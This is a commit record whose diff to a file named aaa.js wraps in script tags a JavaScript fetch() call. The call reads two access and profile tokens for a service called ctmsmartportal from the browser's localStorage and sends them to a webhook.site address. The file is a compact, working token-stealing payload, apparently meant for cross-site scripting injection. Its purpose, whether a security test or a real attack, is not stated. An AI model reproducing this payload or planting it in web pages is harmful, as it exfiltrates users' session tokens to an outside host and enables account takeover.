204cbcb6bf6b72e4cdd92123b3171204e7635379
user77559 <mnervo@themissinglink.com.au>
2026-01-09 17:30:43 +1100

    aaa.js

--- aaa.js
+++ aaa.js
@@ -1,6 +1,8 @@
+<script>
 fetch(
   'https://webhook.site/ctm/?ctmsmartportal_access_token=' +
     encodeURIComponent(localStorage.getItem('ctmsmartportal_access_token')) +
     '&ctmsmartportal_profile_token=' +
     encodeURIComponent(localStorage.getItem('ctmsmartportal_profile_token'))
 );
+</script>
